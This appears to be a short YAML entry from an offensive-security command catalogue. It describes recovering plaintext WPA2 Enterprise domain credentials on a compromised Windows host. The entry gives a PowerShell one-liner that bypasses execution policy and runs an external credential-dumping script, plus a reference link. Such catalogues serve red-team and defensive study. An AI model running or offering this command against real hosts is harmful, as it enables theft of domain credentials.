---
title: |
  Recover plaintext domain credentials from WPA2 enterprise on a compromised host
description: |
  Execute the script from the reference to do all the work necessary to retrieve all WPA2 Enterprise domain credentials stored in the user session.

command: |
  powershell -exec bypass -Command "&{. .\Get-WPAEnterprisePassword.ps1; Get-WlanEnterprisePassword}"
items:
  - Shell
OS:
  - Windows
attack_types:
  - Enumeration
references:
  - https://0x00-0x00.github.io/research/2018/11/06/Recovering-Plaintext-Domain-Credentials-From-WPA2-Enterprise-on-a-compromised-host.html
---
